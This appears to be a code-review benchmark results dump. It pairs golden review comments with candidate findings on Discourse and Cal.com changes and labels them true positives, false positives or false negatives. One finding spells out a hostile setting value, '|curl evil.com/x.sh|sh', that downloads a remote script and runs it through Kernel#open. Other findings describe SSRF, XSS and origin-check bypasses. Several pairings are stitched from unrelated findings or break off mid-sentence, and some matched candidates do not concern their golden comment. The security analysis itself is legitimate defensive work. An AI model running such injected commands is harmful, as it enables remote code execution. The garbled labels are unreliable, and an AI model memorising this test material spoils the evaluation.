`addMembers` and `removeMember` only attach a success handler (`.then(function(){ self.findMembers(); })`) and the calling controller actions (`addMembers`, `removeMember` in admin-group.js.es6) ignore the returned promise. If the request fails - e.g. the 422 `can_not_modify_automatic` response, a validation error, or any 500 - nothing is displayed and the member list is not refreshed, so the admin believes the operation succeeded. Note the server also silently ignores unknown usernames in `add_members`, which compounds the lack of feedback. A failure handler showing `bootbox.alert` (as `save`/`destroy` do) is needed.

Public group members page is now silently capped at 50 members with no pagination

The public group page iterates `members`, which `group-members.js.es6` populates via `model.findMembers()` using the model's default `limit: 50` / `offset: 0`. Previously the endpoint returned all members for non-automatic groups, so the full list was shown. There is no next/previous control in this template (only the admin template got one), so for any group with more than 50 members the page now shows a truncated list with no indication that members are missing, while the counts endpoint still reports the real total.

Removal spec asserts association count but not the cached user_count

"is able to remove a member" only checks `group.users.count == 0`, which is a live SQL count and therefore passes even though `group.users.delete(user_id)` skips the `GroupUser` destroy callbacks and leaves the cached `user_count` column at 1. Asserting `group.user_count` (the value exposed by `BasicGroupSerializer` and shown in the admin UI) would catch the stale-counter bug introduced by the new `remove_member` implementation.

add_members assumes the usernames param is a String

`usernames = params.require(:usernames)` followed by `usernames.split(",")` raises `NoMethodError` (500) if a client sends `usernames[]=a&usernames[]=b`, which is a natural way to call this endpoint and is what Rails produces for an array parameter. Accept both forms (e.g. `Array(usernames).flat_map { |u| u.to_s.split(',') }`) or validate the type and return a 400.

false_negatives.golden_comment: The findMembers() call is now asynchronous and unhandled. The controller may not have member data immediately available, creating a race condition.

The route provides the group's ID in params[:id], but the code attempts to read it from params[:group_id], causing the action to fail. This results in a broken feature when trying to access group memberships.

true_positives.golden_comment: BlockedEmail.should_block_email? method has side effects during a read operation - it updates statistics even when just checking if an email should be blocked. This could cause race conditions in concurrent environments and makes the method name misleading.
true_positives.matched_candidate:
Validator side effect causes match_count to be incremented more than once per signup

`validate_each` calls `BlockedEmail.should_block?`, which writes to the database. Validation is not idempotent for callers: `UsersController#create` calls `user.valid?` (line 168) and then `user.save` (line 172), so the blocked-email counters are incremented twice for a single sign-up attempt, and any other code path that validates a user more than once inflates the counters further. Counting should happen once per attempt, outside the validation callback.
true_positives.reasoning: Both identify the same core bug: BlockedEmail.should_block? performs a database write/side effect during validation/classification, so the counter is incremented as part of a read-like check. The candidate's double-increment example is a concrete consequence of that side effect, not a different issue.

true_positives.golden_comment: The case-sensitive email lookup in `BlockedEmail.should_block?` creates a bypass risk, allowing 'User@Example.com' to bypass a block on 'user@example.com'. This can lead to unauthorized access to blocked users.
true_positives.matched_candidate:
Blocked-email lookup is case sensitive, so the block list is trivially bypassed

`BlockedEmail.should_block?` looks the address up with `BlockedEmail.where(email: email).first`, an exact, case-sensitive comparison, and nothing in the model or the migration normalizes the stored address either. Sign-up emails are not downcased before validation (`User.new_from_params` assigns `params[:email]` verbatim), so an address blocked as `bad@spam.com` passes validation when submitted as `Bad@Spam.com`. The unique index on `blocked_emails.email` is also case sensitive, so duplicate case variants can be stored. Both the stored value and the lookup should be downcased (or the comparison made case-insensitive) for the feature to actually block anything.
true_positives.reasoning: Both identify the same bypass: BlockedEmail.should_block? performs a case-sensitive exact email lookup, so differently cased variants of a blocked address are not blocked. The candidate adds normalization details but points to the same bug.

false_positives.candidate:
Non-atomic match_count increment loses updates and silently ignores save failures

`record.match_count += 1; record.save` is a read-modify-write: two concurrent sign-up attempts with the same blocked address both read the same value and write the same incremented value, so one match is lost. Additionally the return value of `save` is discarded, so a failed save (e.g. a validation error on a legacy row with a blank email) silently drops the statistics. Use an atomic SQL increment (`increment!`/`update_all("match_count = match_count + 1")`) instead.

action_type is NOT NULL with no database default

`action_type` is declared `null: false` without a default; the default value is only applied by the model's `before_validation :set_defaults`. The spec for this feature explicitly anticipates the table being "manually loaded with some emails" — any such bulk insert or raw SQL insert that omits `action_type` will fail with a NOT NULL violation. Adding `default: 1` (the `:block` value) to the column would make the intended default hold at the database level.

Mutable array declared on the controller prototype is shared between instances

`rejectedEmails: Em.A([])` puts a single array object on the class prototype, so every instance created from `Discourse.CreateAccountController` mutates the same array via `pushObject`. If more than one instance is ever created (or the container is reset, e.g. in tests), rejected emails leak across instances and are never cleared. The array should be initialised per instance (e.g. in `init`) or stored as `null` and lazily created.

Server-rejected email is reported to the user as "invalid"

When an email is in `rejectedEmails` the field validation shows `I18n.t('user.email.invalid')`, i.e. the "email address is invalid" message, even though the server rejected it because it is blocked or already taken. After the flash message disappears the user is left with a message telling them their address is malformed, which will send them down the wrong path. The server-provided error message (`result.errors.email`) should be surfaced instead of a generic format error.

New validator spec only covers the stubbed blocked-email branch

The spec stubs `BlockedEmail.should_block?` entirely, so nothing exercises the real lookup (including the case-sensitivity problem), nothing verifies that a `User` with a blocked email actually fails to save, and the whitelist/blacklist branches that were moved out of `User#email_validator` into this new class have no coverage here. A regression in the moved whitelist/blacklist code or in the interaction between the validator and `BlockedEmail` would not be caught.

false_negatives.golden_comment: The regex pattern @(#{domains}) in email_in_restriction_setting? method only matches domain suffixes, not full domains with proper boundary anchoring. An attacker can register evil.example.com to bypass a whitelist entry for example.com.

true_positives.golden_comment: -webkit-box-ordinal-group and -moz-box-ordinal-group require values starting from 1, not 0. If $val is 0, this will cause incorrect rendering in older browsers, leading to layout issues.
true_positives.matched_candidate:
order() mixin maps 0-based `order` onto 1-based legacy ordinal-group

The new `order($val)` mixin emits the same number for `-webkit-box-ordinal-group` / `-moz-box-ordinal-group` as for the standard `order` property. These are not equivalent: in the 2009 box spec `box-ordinal-group` is 1-based (initial value 1) while `order` is 0-based (initial value 0). Consequences: (a) `@include order(0)` emits `-webkit-box-ordinal-group: 0`, which is invalid and is dropped, and (b) any element given `order(1)` intending it to be placed *after* non-ordered siblings will instead be grouped with them in legacy-box engines, because unordered siblings default to ordinal-group 1. The legacy lines should use `$val + 1` (and the mixin should guard against `$val < 0`). This matters for the new usages `@include order(2)` on `.extra-info-wrapper` and `@include order(3)` on `.d-header .panel`, which only accidentally line up today because `.title` has no explicit order.
true_positives.reasoning: The candidate identifies the same bug: order() emits the same value for 0-based order and 1-based legacy box-ordinal-group, so order(0) is invalid and other values mis-order in older browsers. The extra fix/usage details do not change the underlying issue.

false_positives.candidate:
align-items() forwards modern keywords to legacy properties that do not accept them

`align-items($alignment)` passes `$alignment` verbatim to `-webkit-box-align` and `-ms-flex-align`. Those legacy properties only accept `start | end | center | baseline | stretch`, so the very common modern values `flex-start` and `flex-end` will produce invalid declarations that are silently dropped, leaving legacy engines (which are precisely the ones receiving `display: -webkit-box` / `-ms-flexbox` from the new `flexbox()` mixin) with the default `stretch` alignment. The current call sites only use `center` and `baseline`, so the bug is latent, but as a shared mixin it will break the first time someone writes `@include align-items(flex-start)`. The mixin should translate `flex-start`/`flex-end` to `start`/`end` for the legacy properties.

align-items() has no -moz-box-align although flexbox() emits display: -moz-box

`flexbox()` and `inline-flex()` emit `display: -moz-box` / `-moz-inline-box` for old Gecko, and `order()` emits `-moz-box-ordinal-group`, but `align-items()` omits `-moz-box-align`. Old Firefox versions therefore get legacy box layout with no cross-axis alignment at all (default stretch), which is exactly the case the prefix fallback was added for: e.g. `.d-header .contents` and `.small-action` will render with stretched, non-centered children instead of the intended vertical centering. Either add `-moz-box-align` or drop the `-moz-box` display fallbacks so the prefix coverage is internally consistent.

Making .small-action a flex container breaks right alignment of its button

`.small-action` is now `display: flex`, which makes `float` on its direct children a no-op. The `button { float: right; }` rule at the end of the block (and `.topic-avatar { float: left; }`) therefore no longer have any effect: the small-action button will be laid out immediately after `.small-action-desc` instead of being pushed to the right edge of the post, because `.small-action-desc` has no `flex: 1`/`flex-grow` and the button has no `margin-left: auto`. The existing `clear: both` on the flex container is likewise dead. Add `margin-left: auto` to the button (or `flex: 1` to `.small-action-desc`) and remove the now-meaningless float/clear declarations.

Header .panel right alignment relies on auto margins, which the legacy box fallback does not support

`.panel` previously used `float: right`; it now relies on `margin-left: auto` inside the flex `.contents`. Auto margins do not distribute free space in the 2009 flexbox (`display: -webkit-box` / `-moz-box`) that the new `flexbox()` mixin emits as a fallback, and there is no `-webkit-box-pack: end` equivalent. In engines that pick the legacy box display (old WebKit/Gecko builds) the panel with the search/user/hamburger icons will sit flush against the title instead of at the right edge of the header, i.e. a visible header regression for those browsers. Either add the legacy packing properties or drop the legacy `display` fallbacks so those browsers keep the float-based layout.

false_negatives.golden_comment: Mixing float: left with flexbox causes layout issues. Further this PR removes the float-based right alignment for .d-header .panel, which may cause the login panel in the non-Ember/noscript header (where .panel is nested inside .row and not a flex item) to stack under the title instead of remaining right-aligned.
-ms-align-items never existed in any version of IE/Edge; the correct legacy property is -ms-flex-align.

true_positives.golden_comment: The include_website_name method is missing the required ? suffix. Rails serializers expect include_ methods to end with ? for conditional attribute inclusion, a convention followed by other methods in this serializer. Without it, the website_name attribute may not be conditionally included as intended. Additionally, the '.' << website_host string concatenation should be replaced with '.' + website_host or '.#{website_host}' to avoid mutating string literals, which can lead to issues.
true_positives.matched_candidate:
`include_website_name` is missing the trailing `?` so the guard never runs

ActiveModel::Serializers looks for a predicate named `include_<attribute>?`. The method is defined as `include_website_name` (no question mark), so it is dead code and `website_name` is unconditionally serialized. Consequences: (1) the key `website_name` is emitted with a `nil` value for every user that has no website, bloating every user payload and breaking any consumer that checks for key presence; (2) the intended `website.present?` gating is silently not applied. Rename to `include_website_name?`.
true_positives.reasoning: The candidate identifies the same core bug: include_website_name lacks the required trailing ?, so ActiveModel::Serializers does not treat it as the conditional inclusion predicate and website_name is serialized unconditionally. It omits the secondary string-concatenation concern, but the primary issue matches.

false_positives.candidate:
`website_name` is not listed in `untrusted_attributes`, leaking a TL0 user's website to anonymous visitors

`website` is declared in `untrusted_attributes` so that, when `scope.restrict_user_fields?(object)` is true (TL0 user viewed anonymously), the URL is not exposed — this is an anti-spam/privacy measure. The new `website_name` attribute returns the website host (and, for same-domain sites, the full path) but is not added to `untrusted_attributes`, and its own include guard (see `include_website_name`) only checks `website.present?`. The restricted URL is therefore disclosed through `website_name`, defeating the existing restriction. Add `:website_name` to the `untrusted_attributes` list (or make the include predicate also honour `scope.restrict_user_fields?`).

`"." << website_host` mutates a string literal

`discourse_host.ends_with?("." << website_host)` uses destructive append on the literal `"."`. It happens to work today because each evaluation allocates a fresh literal, but it will raise `FrozenError` the moment this file gets `# frozen_string_literal: true` (or the interpreter is run with frozen literals enabled), and it is needlessly allocating/mutating. Use `".#{website_host}"` or `"." + website_host`.

No spec covers `website_name` visibility, so the untrusted/include regressions are undetected

The TL0-seen-as-anonymous context enumerates `untrusted_attributes` but does not include `website_name`, so the fact that the new attribute leaks a restricted website is not caught. There is likewise no spec for a user with a blank website (which currently serialises `website_name: nil` because the include predicate is misnamed `include_website_name`), nor for the sibling-subdomain branch (`www.example.com` website with `forum.example.com` instance). Add specs for these three cases so the guards are actually exercised.

Domain-matching heuristic mis-handles `www.` hosts and false-positives on shared public suffixes

The branch logic only compares hosts when the label counts are equal and > 2. Consequences: (a) website `http://www.example.com/user` on an instance hosted at `example.com` falls through to the `else` branch, where `"example.com".ends_with?(".www.example.com")` is false, so the path is dropped even though it is the same site — exactly the case this PR is meant to handle; (b) hosts sharing only a public suffix, e.g. website `foo.blogspot.com` with instance `bar.blogspot.com`, compare equal on the last two labels and get the full path rendered even though they are unrelated sites. Consider normalising a leading `www.` and comparing registrable domains instead of raw label suffixes.

true_positives.golden_comment: The PollFeed job calls open(SiteSetting.feed_polling_url) without validating the URL, allowing an attacker who controls the feed_polling_url site setting to make the server fetch arbitrary internal or external URLs.
true_positives.matched_candidate:
Kernel#open on a site-setting URL allows command execution and SSRF

`open(SiteSetting.feed_polling_url)` uses `Kernel#open`, which executes a subprocess when the argument starts with `|` (e.g. `feed_polling_url = "|curl evil.com/x.sh|sh"`), and will happily read local files/internal addresses otherwise. Even though the setting is admin-only, a single compromised/misconfigured setting turns into remote code execution on the Sidekiq host. Use `URI.parse(url).open` (or an explicit HTTP client) and validate the scheme is http/https. The same concern applies to `open(url)` in `TopicEmbed.import_remote`.
true_positives.reasoning: The candidate identifies the same unvalidated open(SiteSetting.feed_polling_url) call and resulting arbitrary URL fetch/SSRF risk. Its additional command-execution and TopicEmbed details do not change the underlying issue.

true_positives.golden_comment: The current origin validation using indexOf is insufficient and can be bypassed. An attacker could use a malicious domain like evil-discourseUrl.com to pass this check.
true_positives.matched_candidate:
postMessage origin check uses substring matching

`if (discourseUrl.indexOf(e.origin) === -1) { return; }` accepts any `e.origin` that is a substring of the configured `discourseUrl` (and also silently accepts `e.origin === ''`, since `indexOf('')` is 0). This is not an origin comparison; it should compare `e.origin` against the exact origin derived from `discourseUrl`. The current check weakens the only authentication on the resize messages and will also mis-handle a `discourseUrl` without a trailing slash (line 7 concatenates `"embed/best"` directly onto it, producing a wrong iframe src).
true_positives.reasoning: Both identify the same origin-validation bug: using indexOf/substring matching instead of an exact origin comparison allows malicious domains to bypass the check. The candidate adds related details, but the core issue matches.

true_positives.golden_comment: The ERB block closes with end if, which is invalid Ruby/ERB and will raise at render; it should just be end to close the if block.
true_positives.matched_candidate:
`<%- end if %>` typo makes the header conditional depend on the logo link expression

Line 6 reads `<%- end if %>` instead of `<%- end %>`. The generated template code becomes `end if` followed by the next emitted statement, which Ruby parses as a modifier-`if` whose condition is the *next* expression (the `link_to(image_tag(SiteSetting.logo_url ...))` on line 8). As a result the logo is evaluated/appended before the Discussion/Start-Discussion button, the ordering in the rendered header is reversed, and the whole if/else block is gated on the truthiness of a side-effecting buffer append. It is also one token away from an outright `SyntaxError` in this template (which would 500 the main embed action). Change it to `<%- end %>`.
true_positives.reasoning: Both comments identify the same bug: the ERB block uses `end if` instead of `end`, making the template invalid and requiring the same fix.

true_positives.golden_comment: Calling `i.content.scrub` assumes that `i.content` is always populated. However, many RSS feeds do not provide a `content` field, leading to a potential nil pointer exception when `i.content` is nil. A fallback to `description` should be implemented to prevent crashes.
true_positives.matched_candidate:
Nil/absent feed item content aborts the whole poll

`i.content.scrub` assumes every item exposes `content`. Plain RSS 2.0 feeds commonly only provide `description` (SimpleRSS returns `nil` for `content`/`content_encoded`), so this raises `NoMethodError` on `nil`. Because the loop has no per-item rescue and the job is declared `sidekiq_options retry: false`, a single such item silently aborts the import of the entire feed (and all later items). Fall back to `description`/`summary` and wrap each item so one bad entry does not kill the run.
true_positives.reasoning: Both identify the same bug: calling i.content.scrub assumes content is present, but RSS feeds often only provide description, so nil content raises NoMethodError. The candidate adds impact details but points to the same underlying issue and fallback.

false_positives.candidate:
Feed content is stored as pre-cooked HTML with no sanitization (stored XSS)

`poll_feed` takes `i.content` straight from the remote RSS/Atom feed, runs `CGI.unescapeHTML` on it and hands it to `TopicEmbed.import`, which creates the post with `cook_method: Post.cook_methods[:raw_html]`. `Post#cook` (app/models/post.rb:133) then returns `raw` verbatim as `cooked`, completely bypassing PrettyText/the HTML sanitizer. The resulting HTML is rendered unescaped both in the Ember client (`{{{cooked}}}`) and in app/views/embed/best.html.erb (`raw post.cooked`). Any `<script>`, `onerror=`, `<iframe>` etc. present in the feed (compromised blog, feed that republishes user-submitted content, man-in-the-middle on a plain-HTTP feed URL) executes in the browsers of all forum users, including admins. The feed HTML should be run through the same sanitizer/whitelist that `import_remote` applies via Readability's tag/attribute whitelist before being stored as cooked output.

Re-import crashes when the embedded post has been deleted

In the update branch, `post = embed.post` is used directly by `PostRevisor.new(post)`. `Post` includes `Trashable`, so a soft-deleted (or hard-deleted) post makes `embed.post` return `nil`, and `PostRevisor#revise!` then raises `NoMethodError` on `nil.raw`. Any topic/post that a moderator deletes will therefore make every subsequent feed poll or embed retrieval for that URL blow up (and, since `Jobs::PollFeed` has `retry: false` and no per-item rescue, abort the rest of the feed). Guard for a missing post and either skip or recreate the topic.

`import_remote` calls `open(url)` without requiring open-uri

`import_remote` only does `require 'ruby-readability'`; it never requires `open-uri`. If nothing else in the process has loaded open-uri (e.g. `app/jobs/scheduled/poll_feed.rb`, which does require it, has not been autoloaded yet), `open(url)` falls back to `Kernel#open` as a file open and raises `Errno::ENOENT` for an http URL. This path is reached from `Jobs::RetrieveTopic` -> `TopicRetriever#fetch_http` and from the disqus thor task, so embed retrieval can fail non-deterministically depending on load order. Add `require 'open-uri'` (preferably `URI.parse(url).open`).

New embed.css/embed.js assets are not added to the precompile list

`stylesheet_link_tag 'embed'` references the newly added `app/assets/stylesheets/embed.css.scss`, and `app/assets/javascripts/embed.js` is meant to be served to third-party sites, but neither file is reachable from `application.css`/`application.js` and the PR does not add them to `config.assets.precompile` in `config/application.rb`. With Sprockets in production (`assets.compile = false`) this raises an "asset is not present in the asset pipeline / not precompiled" error, so the embed page will 500 and the embed snippet will 404 after deploy.

Two PollFeed guard tests pass vacuously

"requires feed_polling_url" (line 18) and "requires embed_by_username" (line 24) only stub the one setting they are about; `feed_polling_enabled?` is left at its default, which is `false` in config/site_settings.yml. The first condition in `execute` therefore short-circuits and `poll_feed` would not be called even if the url/username guards were removed entirely, so these two examples assert nothing. Stub `feed_polling_enabled?` to true in both, and add coverage for `poll_feed` itself (item parsing, nil content, import call), which is currently untested.

`import` mutates the caller's `contents` string

`contents << "\n<hr>..."` appends the "Imported from" footer in place rather than building a new string. Callers that reuse or memoize the string (e.g. a `let(:contents)` in specs, or any retry loop) will get the footer appended repeatedly, and the computed `content_sha1` will differ run to run for identical input, causing spurious "content changed" revisions. A frozen string argument would raise `RuntimeError`. Use `contents = contents + "..."` / `contents.dup`.

SETNX followed by EXPIRE can leave a permanent throttle key

`$redis.setnx(retrieved_key, "1")` and `$redis.expire(retrieved_key, 60)` are two round trips; if the process dies or the connection drops between them the key exists with no TTL and that embed URL is throttled forever, so the topic can never be retrieved. Use a single atomic `set(key, "1", ex: 60, nx: true)`.

One Sidekiq job enqueued per request for an unknown embed_url

Every request for an embed_url without a topic enqueues `Jobs::RetrieveTopic`; throttling happens only inside the job (`TopicRetriever#retrieved_recently?`). Since the endpoint is anonymous and unauthenticated (only a Referer check), a client hitting `embed/best` in a loop—or the loading page's unconditional 30s reload for many visitors—can flood the queue with jobs that all immediately no-op. Consider rate limiting the enqueue (e.g. check the same redis key before enqueueing).

Already-committed migration changed to `create_table ... force: true`

Editing an existing migration to add `force: true` means that on any database where `top_topics` exists but this migration version is not recorded (partially migrated/restored DB, schema loaded from schema.rb), running migrations will silently `DROP TABLE top_topics` and recreate it, losing data. Changing a released migration also makes checksum/history divergence between installs. If a reset is really needed, add a new migration instead.

No coverage renders the new embed views

The controller spec stubs `TopicView.new` (returning nil) and Rails controller specs do not render views unless `render_views` is enabled, so neither `embed/best.html.erb` nor `layouts/embed.html.erb` is ever exercised. That is why the `<%- end if %>` defect on best.html.erb:6 and the `@topic_view` usage are unverified. Add a `render_views` example with a real topic so template errors are caught.

embed_url limited to 255 chars with a unique index

`t.string :embed_url` defaults to varchar(255) in Postgres and is also the unique index column. Feed/article URLs regularly exceed 255 characters (tracking params, long slugs), which makes `TopicEmbed.create!` raise `PG::StringDataRightTruncation` inside the import transaction and permanently prevents embedding those pages. Use `:text` (with an index on the value or a hash) or document the limit and truncate/validate explicitly.

false_negatives.golden_comment: postMessage targetOrigin should be the origin (scheme+host+port), not the full referrer URL; using the full URL will cause the message to be dropped and prevent resizing.

The code sets X-Frame-Options: ALLOWALL which completely disables clickjacking protection. The referer validation can be bypassed (referer headers are easily spoofed), and the fallback to empty string for nil referer masks validation failures.

The TopicEmbed.import method is susceptible to a NoMethodError if the contents parameter is nil when attempting to append a string, and an XSS vulnerability due to unescaped url interpolation in the generated HTML.

An unescaped request header (request.referer) is interpolated into JavaScript without proper escaping, which can lead to XSS vulnerabilities if the referer contains malicious content. This issue can allow attackers to execute arbitrary scripts in the context of the application.

true_positives.golden_comment: The downsize method is defined twice. The second definition, which expects a single dimensions string parameter, overrides the first, which expected separate max_width and max_height parameters. This makes the original method unreachable and breaks existing code that calls it with separate width and height arguments.
true_positives.matched_candidate:
Duplicate `self.downsize` definition silently discards the 4-argument version

`self.downsize(from, to, max_width, max_height, opts={})` is defined at line 145 and then immediately redefined at line 149 as `self.downsize(from, to, dimensions, opts={})`. Ruby keeps only the last definition, so the width/height form is dead code (it also emits a "method redefined; discarding old definition" warning). The two call conventions must be merged into one method (e.g. accept either a geometry string or width/height).
true_positives.reasoning: Both identify the same bug: downsize is defined twice and the later dimensions-string definition overrides the earlier max_width/max_height version, making the original unreachable and breaking callers that pass separate width and height arguments.

true_positives.golden_comment: Hardcoding maxSizeKB = 10 * 1024 ignores Discourse.SiteSettings['max_' + type + '_size_kb'], so the client-side limit can diverge from server-side and per-type settings (also applies to the 413 handler below).
true_positives.matched_candidate:

In `checkIfIsAvailable`, the new block sets `dateOverrideExist = true` for any date override whose date matches the slot's date, and then `if (dateOverrideExist) return true;` returns early. This return happens *before* the `busy.every(...)` loop, so on any day that has a date override the function reports every slot as available and completely ignores existing bookings, external calendar busy times, event buffers and reserved (`selectedSlots`) entries. Any host with a date override can therefore be double-booked. The override check should only narrow availability, not short-circuit the busy evaluation.

working-hours check rejects slots when a user has more than one availability block per day

`workingHours.find((workingHour) => ...)` returns truthy as soon as *one* working-hours entry does not contain the slot, and the result is interpreted as "slot is outside of working hours" -> unavailable. A user whose schedule has several blocks on the same weekday (e.g. 09:00-12:00 and 14:00-18:00) produces two `WorkingHours` entries with the same `days`, so a 10:00 slot is inside the first and outside the second and gets dropped — all slots vanish for split schedules. The same happens for schedules that cross UTC midnight, where `getWorkingHours` emits two normalized entries covering the same days. The predicate must be "no entry contains the slot" (`!workingHours.some(contains)`), not "some entry does not contain it". Note this path applies to personal events too, because single-user events are treated as fixed hosts.

Date-override check rejects slots when a date has multiple override ranges

`dateOverrides.find((date) => ...)` returns truthy for the first override that does *not* contain the slot, and that result is treated as "slot is not within the date override" -> unavailable. Cal.com allows several time ranges for the same override date (and several hosts' overrides are flattened into the same array when a team event is evaluated per host). With two ranges on one date (e.g. 09:00-11:00 and 14:00-16:00), a slot inside the first range is outside the second, so the slot is rejected and every slot on that date disappears. The condition should be "none of the overrides for this date contain the slot".

Slots that only partially overlap a date override are treated as inside it

The override containment test marks a slot as outside the override only when `slotEndTime <= override.start` or `slotStartTime > override.end`. A slot that starts before the override start but ends inside it (slot 13:30-14:30 vs override 14:00-18:00) or starts inside but ends after the end (slot 17:30-18:30 vs 14:00-18:00) satisfies neither condition, so it is considered available. Combined with the early `return true` for `dateOverrideExist`, such partially overlapping slots are offered for booking outside the host's overridden availability. The correct test is `slotStartTime < override.start || slotEndTime > override.end`.

Override date comparison mixes server-local and UTC dates

`dayjs(date.start).add(utcOffset, "minutes").format("YYYY MM DD")` formats in the *server's* local timezone (plain `dayjs(...)`, no `.utc()`), while it is compared against `slotStartTime.format("YYYY MM DD")`, which is in UTC (`slotStartTime = time.utc()`). On any deployment whose process timezone is not UTC the two dates can differ by a day, so date overrides are matched to the wrong day: overrides are either ignored (making unavailable time bookable) or applied to the neighbouring day. Use `dayjs.utc(date.start)` for the comparison. Tests run with TZ=UTC will not catch this.

The new override conversion reduces the shifted instant to minutes-since-midnight via `hour() * 60 + minute()`. When `offset` (invitee offset minus organizer offset) pushes the override across a day boundary — e.g. an override 22:00-23:00 in the organizer's timezone viewed by an invitee 5 hours ahead — the computed `startTime`/`endTime` wrap around to small values and are applied to the invitee's *same* day, so the override's slots are generated on the wrong day. If only one of the two endpoints wraps, `endTime < startTime` and `buildSlots` silently discards the range (`if (start >= end) continue`), so the override yields no slots at all. The day offset produced by the shift has to be carried, not discarded.

`dayjs(override.start.toString()).tz(override.timeZone)` is called with `timeZone` typed as optional (`timeZone?: string` in packages/types/schedule.d.ts). When a caller of `getSlots` passes date overrides without a `timeZone` (the type permits it, and only the slots tRPC router was updated to populate it), the dayjs timezone plugin falls back to the default/local timezone, so `organizerUtcOffset` is computed for the wrong zone and the override is shifted by an arbitrary amount instead of being treated as organizer-local. Either make `timeZone` required for date overrides or explicitly fall back to `organizerTimeZone` which is already passed into `getSlots`.

The PR's primary claim is that date overrides of fixed hosts are now honoured for ROUND_ROBIN events (so slots where the fixed host is unavailable are no longer offered). The only new test added covers a single-user event with a different invitee timezone. There is no scenario with a ROUND_ROBIN event type, a fixed host carrying a date override and a non-fixed host available all day, which is exactly the behaviour added in `checkIfIsAvailable` and the riskiest part of the change (it currently also bypasses busy-time checks). Without such a test the regression this PR fixes can silently come back.

toHaveTimeSlots matcher does not compare lengths, so the new assertion can pass with missing slots

The matcher iterates `schedule.slots[dateString].map(...).every((actualSlotTime, index) => ...)` over the *actual* slots only and never checks that the number of returned slots equals `expectedSlots.length`. New cron query on `cancelled`/`scheduledDate` has no supporting index

The migration adds `cancelled BOOLEAN` with no default and no index, while the cron now runs `findMany({ where: { cancelled: true, scheduledDate: { lte: ... } } })` every 15 minutes against `WorkflowReminder`, a table that grows with every booking. With no index on (`cancelled`, `scheduledDate`) this is a full table scan on each run. Making the column `BOOLEAN NOT NULL DEFAULT false` (and the Prisma field `Boolean @default(false)`) would also avoid the three-state null/false/true semantics that every future query has to account for.
true_positives.reasoning: The candidate identifies the same core issue: the new cancelled column is nullable with no default, creating null/false/true ambiguity. It additionally raises a missing index concern, but that does not change the underlying match.

false_positives.candidate:
One failing SendGrid cancellation permanently blocks all future cancellations

The whole cancellation loop is wrapped in a single try/catch and the `prisma.workflowReminder.delete(...)` calls are collected as lazy Prisma promises that are only executed by `await Promise.all(...)` after the loop finishes. If any `client.request` call throws (SendGrid rejects a cancellation that is less than ~10 minutes before `sendAt`, or returns 400 because the batch already has a `cancel` status), the loop aborts and *none* of the already-cancelled reminders are deleted from the DB. On the next cron run the same rows are re-processed; the previously-cancelled batches now return an error themselves, so the run aborts again. The result is a poisoned queue in which no reminder is ever cancelled or removed — exactly the failure mode this PR is meant to fix. The failure is also only `console.log`ged and the endpoint still returns HTTP 200, so it is invisible to monitoring. Each reminder should be cancelled and deleted independently with its own try/catch.

immediateDelete branch cancels at SendGrid but never deletes the reminder row

In the `immediateDelete` branch the function returns right after the SendGrid cancel request, without deleting the `WorkflowReminder` row and without setting `cancelled`. Callers that rely on the function to clean up (e.g. `handleNewBooking.ts`, where the original booking is kept) leave behind rows with `scheduled: true` and a stale `referenceId` pointing at a cancelled batch. These rows only disappear when the CRON's `deleteMany` eventually removes reminders whose `scheduledDate` has passed, and in the meantime there is no record that the cancellation needs retrying if the SendGrid request failed. The function name (`delete...`) and the other two branches (delete row / flag row) make this inconsistency a correctness problem, not just cosmetics.

Workflow/step deletion still relies on immediate SendGrid cancellation with no retry possible

When a workflow is deleted (line 214) or a step is removed (line 521), reminders are cancelled with `immediateDelete = true` and immediately afterwards the workflow/step is deleted, which cascade-deletes the `WorkflowReminder` rows. If the direct `POST /v3/user/scheduled_sends` call fails — the failure mode this PR addresses, and failures are only `console.log`ged — the scheduled emails are still delivered and the DB record needed to retry the cancellation is gone. Deleting a workflow with many upcoming reminders can also exceed SendGrid's pending-cancellation limit in one burst, reintroducing the original bug for this path.

remindersToCancel query is not restricted to EMAIL reminders with a referenceId

The query selects every `WorkflowReminder` with `cancelled: true`, without filtering on `method: WorkflowMethods.EMAIL` or on a non-null `referenceId`, and then posts `reminder.referenceId` as a SendGrid `batch_id`. Today only email reminders ever get the flag, but any row that is flagged with a Twilio SID or a null reference (now or after a future change) will produce a SendGrid 400 which, given the shared try/catch, aborts the whole cancellation batch (see the loop issue). Add the method/referenceId filters to make the query match the intent stated in the comment.

Unused `Prisma` import and malformed import formatting

The import list was changed to a value import that now includes `Prisma`, but after removing the `Prisma.BatchPayload` usages `Prisma` is no longer referenced anywhere in the file, so this is an unused import that will trip `no-unused-vars` in CI. The entry also lacks the trailing comma (`TimeUnit,\n  Prisma\n}`), which prettier will flag. Both will fail the lint/format check.

No test coverage for the new deferred cancellation flow

The fix introduces a new state machine (flag `cancelled` on cancel/reschedule → cron cancels at SendGrid within one hour → delete row) spread across the cancel handler, the reschedule handler, the workflow router and this cron endpoint, but no test is added. Given that the previous attempt at this fix (#6991) shipped broken and silently stopped cancelling emails, at least a unit test for `deleteScheduledEmailReminder` (each of the three branches) and for the cron's cancellation loop (including a failing SendGrid request not blocking the remaining reminders) would prevent another silent regression.

true_positives.golden_comment: Because backupCodes are decrypted and mutated in memory before being written back, two concurrent login requests using the same backupCode could both pass this check and update, so a single backup code may effectively be accepted more than once if used concurrently, weakening the intended one-time-use semantics.
true_positives.matched_candidate:
Backup-code consumption is a non-atomic read-modify-write, allowing reuse

Previously `onEnable()` fired as soon as the enable API returned 200. Now the success path only calls `setStep(SetupStep.DisplayBackupCodes)` and `onEnable()` is invoked exclusively by the "Close" button handler. If the user dismisses the dialog with ESC, the X, or an overlay click (which triggers `onOpenChange`), 2FA is already enabled server-side but the parent settings view is never notified, so the two-factor switch stays in the "off" state until a manual reload. `"missing_backup_codes": "No backup codes found. The only actual remedy is to disable and re-enable 2FA, so the message sends users on an impossible errand. Either add a regeneration path or change the text to describe the real recovery procedure.

`backupCodes: symmetricEncrypt(JSON.stringify(backupCodes), process.env.CALENDSO_ENCRYPTION_KEY)` persists the plaintext codes under a single application-wide key, and both the login and disable paths decrypt them to compare. Unlike `twoFactorSecret`, backup codes never need to be recovered in cleartext — verification only requires an equality check — so they should be stored as hashes (e.g. bcrypt/sha-256 per code). As written, anyone who obtains the database plus `CALENDSO_ENCRYPTION_KEY` (one secret shared by every other encrypted field) gets a usable 2FA bypass for every user.

Adding `tabIndex={-1}` to the show/hide-password button removes it from the tab order for all `PasswordField` consumers across the app (login, signup, 2FA modals). Keyboard-only and screen-reader users can no longer reach this control even though it has an `sr-only` label, which is an accessibility regression affecting every password input, not just the 2FA dialogs. Previously the values were taken from `evt.destinationCalendar`.

events.patch called with possibly undefined calendarId

